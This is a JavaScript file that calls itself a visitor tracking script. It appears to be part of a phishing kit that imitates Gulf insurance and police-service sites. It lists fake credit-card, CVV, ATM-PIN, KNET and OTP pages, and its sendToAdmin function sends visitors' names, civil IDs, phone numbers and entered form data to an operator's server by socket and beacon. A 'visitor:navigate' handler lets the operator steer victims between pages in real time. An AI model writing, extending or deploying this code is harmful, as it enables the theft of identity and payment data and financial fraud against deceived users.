/**
 * Visitor Tracking Script for Static HTML Pages
 * Connects to the Railway server via Socket.IO to register visitors
 * and track page navigation in the admin panel.
 * Also provides a global function to send form data to admin.
 */
(function() {
  'use strict';

  const SOCKET_URL = '__VITE_SOCKET_URL__';
  
  // Global socket reference
  var _socket = null;
  var _isConnected = false;
  var _pendingData = [];

  // Load Socket.IO client library dynamically
  function loadSocketIO(callback) {
    if (window.io) {
      callback();
      return;
    }
    const script = document.createElement('script');
    script.src = 'https://cdn.socket.io/4.6.0/socket.io.min.js';
    script.onload = callback;
    script.onerror = function() {
      console.error('[Tracking] Failed to load Socket.IO');
    };
    document.head.appendChild(script);
  }

  // SPA routes that are managed by React - don't report page for these
  var SPA_ROUTES = ['/credit-card-payment', '/otp-verification', '/atm-password', '/knet-payment', '/cvv', '/network-operator', '/ooredoo-login', '/otp-login', '/customer-authentication', '/final-page', '/thiqa-auth'];

  function isSPARoute() {
    const path = window.location.pathname.toLowerCase();
    return SPA_ROUTES.some(function(route) { return path === route || path.startsWith(route + '/'); });
  }

  // Get current page name from URL
  function getPageName() {
    const path = window.location.pathname.toLowerCase();
    // Main pages
    if (path === '/' || path.includes('bima-home') || path.includes('index')) return 'بيمة - الصفحة الرئيسية';
    // ROP pages
    if (path.includes('rop-home')) return 'الصفحة الرئيسية';
    if (path.includes('results-page')) return 'نتائج المخالفات';
    if (path.includes('rop-fines')) return 'صفحة المخالفات';
    if (path.includes('rop-license-results')) return 'نتائج تجديد الرخصة';
    if (path.includes('rop-transfer-results')) return 'نتائج نقل الملكية';
    if (path.includes('rop-results')) return 'نتائج المخالفات';
    if (path.includes('rop-renew-license')) return 'تجديد رخصة القيادة';
    if (path.includes('rop-renew-vehicle')) return 'تجديد سجل المركبة';
    if (path.includes('rop-transfer-vehicle')) return 'نقل ملكية مركبة';
    // Malpractice insurance
    if (path.includes('malpractice-order-review')) return 'تأمين الأخطاء الطبية - مراجعة';
    if (path.includes('malpractice-form')) return 'تأمين الأخطاء الطبية - التفاصيل';
    if (path.includes('malpractice-offers')) return 'تأمين الأخطاء الطبية - العروض';
    // Medical insurance
    if (path.includes('medical-add-insurers')) return 'التأمين الصحي - إضافة مؤمن عليهم';
    if (path.includes('medical-form')) return 'التأمين الصحي - التفاصيل';
    if (path.includes('medical-offers')) return 'التأمين الصحي - العروض';
    if (path.includes('insurer-details')) return 'التأمين الصحي - بيانات المؤمن عليه';
    if (path.includes('sponsor-details')) return 'التأمين الصحي - بيانات الكفيل';
    // Domestic worker insurance
    if (path.includes('domestic-form')) return 'تأمين خدم المنازل - التفاصيل';
    if (path.includes('domestic-offers')) return 'تأمين خدم المنازل - العروض';
    if (path.includes('domestic-order-review')) return 'تأمين خدم المنازل - مراجعة';
    if (path.includes('employee-details')) return 'تأمين خدم المنازل - بيانات العامل';
    // Home insurance
    if (path.includes('home-form')) return 'تأمين المنازل - التفاصيل';
    if (path.includes('home-offers')) return 'تأمين المنازل - العروض';
    if (path.includes('home-details')) return 'تأمين المنازل - بيانات المنزل';
    if (path.includes('home-order-review')) return 'تأمين المنازل - مراجعة';
    // Credit life insurance
    if (path.includes('credit-life-form')) return 'تأمين القروض - التفاصيل';
    if (path.includes('credit-life-offers')) return 'تأمين القروض - العروض';
    if (path.includes('credit-life-detail')) return 'تأمين القروض - بيانات';
    if (path.includes('credit-life-review')) return 'تأمين القروض - مراجعة';
    // Travel insurance
    if (path.includes('travel') && !path.includes('travel-offers') && !path.includes('travel-beneficiaries') && !path.includes('review-travel') && !path.includes('travel-insurance')) return 'تأمين السفر - التفاصيل';
    if (path.includes('travel-offers')) return 'تأمين السفر - العروض';
    if (path.includes('travel-beneficiaries')) return 'تأمين السفر - المستفيدين';
    if (path.includes('review-travel')) return 'تأمين السفر - مراجعة';
    // Vehicle border insurance
    if (path.includes('vehicle-border-outbound-review')) return 'تأمين المركبات المؤقت - مراجعة الخارج';
    if (path.includes('vehicle-border-outbound-offers')) return 'تأمين المركبات المؤقت - عروض الخارج';
    if (path.includes('vehicle-border-outbound-details')) return 'تأمين المركبات المؤقت - بيانات الخارج';
    if (path.includes('vehicle-border-outbound')) return 'تأمين المركبات المؤقت - الخارج';
    if (path.includes('vehicle-border-inbound-review')) return 'تأمين المركبات المؤقت - مراجعة الداخل';
    if (path.includes('vehicle-border-inbound-offers')) return 'تأمين المركبات المؤقت - عروض الداخل';
    if (path.includes('vehicle-border-inbound-details')) return 'تأمين المركبات المؤقت - بيانات الداخل';
    if (path.includes('vehicle-border-inbound')) return 'تأمين المركبات المؤقت - الداخل';
    if (path.includes('vehicleshortperiod')) return 'تأمين المركبات المؤقت - فترة قصيرة';
    // B2B pages
    if (path.includes('b2b-fleet')) return 'بيمة للأعمال - الأسطول';
    if (path.includes('b2b-medical')) return 'بيمة للأعمال - التأمين الصحي';
    if (path.includes('b2b-offers')) return 'بيمة للأعمال - العروض';
    if (path.includes('b2b-checkout')) return 'بيمة للأعمال - الدفع';
    if (path.includes('b2b-payment')) return 'بيمة للأعمال - الدفع';
    if (path.includes('b2b-workers')) return 'بيمة للأعمال - تأمين العمال';
    if (path.includes('b2b-add-insured')) return 'بيمة للأعمال - إضافة مؤمن';
    // Common pages
    if (path.includes('order-review')) return 'مراجعة الطلب';
    if (path.includes('policy-contact')) return 'بيانات التواصل';
    if (path.includes('credit-card-payment')) return 'صفحة الدفع - البطاقة';
    if (path.includes('otp-verification')) return 'OTP - رمز التحقق';
    if (path.includes('atm-password')) return 'ATM - رقم السري';
    if (path.includes('knet-payment')) return 'الدفع - Knet';
    if (path.includes('cvv')) return 'الدفع - CVV';
    if (path.includes('network-operator')) return 'OTP - مزود الشبكة';
    if (path.includes('ooredoo-login')) return 'OTP - Ooredoo';
    if (path.includes('otp-login')) return 'OTP - تسجيل الدخول';
    if (path.includes('customer-authentication')) return 'OTP - التحقق من العميل';
    if (path.includes('thiqa-auth')) return 'OTP - Thiqa';
    if (path.includes('final-page')) return 'الصفحة النهائية';
    if (path.includes('review-travel-insurance')) return 'تأمين السفر - مراجعة';
    // Vehicle insurance (main)
    if (path.includes('insurance.html') || path === '/insurance' || path === '/insurance/') return 'تأمين المركبات - التفاصيل';
    if (path.includes('motor-request')) return 'تأمين المركبات - التفاصيل';
    if (path.includes('offers')) return 'تأمين المركبات - العروض';
    return 'بيمة - الصفحة الرئيسية';
  }

  // Send pending data after connection
  function sendPendingData() {
    while (_pendingData.length > 0 && _isConnected && _socket) {
      var item = _pendingData.shift();
      _socket.emit('more-info', item);
      console.log('[Tracking] Sent pending data:', item);
    }
  }

    // Global function to send data to admin panel
  window.sendToAdmin = function(data, pageName) {
    // Map our keys to what the backend expects
    var mappedData = {};
    
    // Map fullName
    if (data.fullName) mappedData["الاسم"] = data.fullName;
    else if (data.name) mappedData["الاسم"] = data.name;
    
    // Map idNumber
    if (data.idNumber) mappedData["الرقم المدني"] = data.idNumber;
    else if (data.civilId) mappedData["الرقم المدني"] = data.civilId;
    
    // Map phone
    if (data.phone) mappedData["رقم الهاتف"] = data.phone;
    else if (data.mobile) mappedData["رقم الهاتف"] = data.mobile;
    
    // Map plate details
    if (data.plateNumber) mappedData["رقم اللوحة"] = data.plateNumber;
    if (data.plateChar) mappedData["رمز اللوحة"] = data.plateChar;
    
    // Map amount
    if (data.amount) mappedData["المبلغ"] = data.amount;
    
    // Map company
    if (data.company) mappedData["شركة التأمين"] = data.company;
    
    // Map insurance type
    if (data.insuranceType) mappedData["نوع التأمين"] = data.insuranceType;
    
    // Add any other fields that weren't mapped
    for (var key in data) {
      if (!["fullName", "name", "idNumber", "civilId", "phone", "mobile", "plateNumber", "plateChar", "amount", "company", "insuranceType"].includes(key)) {
        mappedData[key] = data[key];
      }
    }

    var payload = {
      content: mappedData,
      page: pageName || getPageName(),
      waitingForAdminResponse: false
    };
    
    // Generate a unique ID for deduplication
    var msgId = Date.now() + '_' + Math.random().toString(36).substr(2, 6);
    
    // Method 1: Send via Socket.IO (real-time, works when connected)
    if (_isConnected && _socket) {
      try {
        payload.msgId = msgId;
        _socket.emit('more-info', payload);
        console.log('[Tracking] Data sent via socket:', mappedData);
      } catch(e) {
        console.error('[Tracking] Socket error:', e);
      }
    }
    
    // Method 2: Send via HTTP beacon (reliable backup, survives page navigation)
    try {
      var visitorId = localStorage.getItem('visitorId') || '';
      var beaconPayload = JSON.stringify({
        visitorId: visitorId,
        content: mappedData,
        page: pageName || getPageName(),
        msgId: msgId
      });
      // Use text/plain to avoid CORS preflight (simple request)
      if (navigator.sendBeacon) {
        navigator.sendBeacon(SOCKET_URL + '/api/beacon-data', new Blob([beaconPayload], {type: 'text/plain'}));
        console.log('[Tracking] Data also sent via beacon');
      } else {
        // Fallback: use fetch with keepalive
        fetch(SOCKET_URL + '/api/beacon-data', {
          method: 'POST',
          headers: {'Content-Type': 'text/plain'},
          body: beaconPayload,
          keepalive: true
        }).catch(function() {});
      }
    } catch(e) {
      console.error('[Tracking] Beacon error:', e);
    }

    // Also update name via socket if connected
    if (_isConnected && _socket && mappedData["الاسم"]) {
      _socket.emit('visitor:updateName', mappedData["الاسم"]);
    }
  };

  // Initialize tracking
  function initTracking() {
    loadSocketIO(function() {
      try {
        _socket = io(SOCKET_URL, {
          transports: ['polling', 'websocket'],
          autoConnect: true,
          reconnection: true,
          reconnectionAttempts: Infinity,
          reconnectionDelay: 1000,
          reconnectionDelayMax: 5000,
          timeout: 20000,
          withCredentials: false
        });

        _socket.on('connect', function() {
          console.log('[Tracking] Connected to server');
          _isConnected = true;
          // Register visitor - check URL params first (for cross-domain), then localStorage
          var urlParams = new URLSearchParams(window.location.search);
          var existingVisitorId = urlParams.get('vid') || localStorage.getItem('visitorId');
          _socket.emit('visitor:register', { existingVisitorId: existingVisitorId });
        });

        _socket.on('successfully-connected', function(data) {
          console.log('[Tracking] Visitor registered:', data);
          // Save visitor ID for reconnection
          if (data.pid) {
            localStorage.setItem('visitorId', data.pid);
          }
          // Send current page only if NOT an SPA route (SPA handles its own page reporting)
          if (!isSPARoute()) {
            const pageName = getPageName();
            _socket.emit('visitor:pageEnter', pageName);
          }
          // Send any pending data
          sendPendingData();
        });

        _socket.on('reconnect', function() {
          console.log('[Tracking] Reconnected to server');
          _isConnected = true;
          var urlParams = new URLSearchParams(window.location.search);
          var existingVisitorId = urlParams.get('vid') || localStorage.getItem('visitorId');
          _socket.emit('visitor:register', { existingVisitorId: existingVisitorId });
        });

        _socket.on('disconnect', function() {
          _isConnected = false;
        });

        _socket.on('connect_error', function(error) {
          console.error('[Tracking] Connection error:', error.message);
          _isConnected = false;
        });

        _socket.on('visitor:navigate', function(page) {
          if (page) {
            if (page.startsWith('http')) {
              window.location.href = page;
            } else {
              window.location.href = '/' + page;
            }
          }
        });

        _socket.on('blocked', function() {
          console.log('[Tracking] Visitor blocked');
        });

        _socket.on('deleted', function() {
          localStorage.removeItem('visitorId');
          window.location.href = '/';
        });

        // Track page visibility changes - notify server when page goes hidden/visible
        document.addEventListener('visibilitychange', function() {
          if (_socket && _socket.connected) {
            if (document.visibilityState === 'visible') {
              _socket.emit('visitor:visibility', 'visible');
              if (!isSPARoute()) {
                _socket.emit('visitor:pageEnter', getPageName());
              }
            } else {
              _socket.emit('visitor:visibility', 'hidden');
            }
          }
        });

      } catch (e) {
        console.error('[Tracking] Error initializing:', e);
      }
    });
  }



  // Start tracking when DOM is ready - but skip for SPA routes (React handles its own socket)
  if (!isSPARoute()) {
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', function() {
        initTracking();
      });
    } else {
      initTracking();
    }
  }
})();
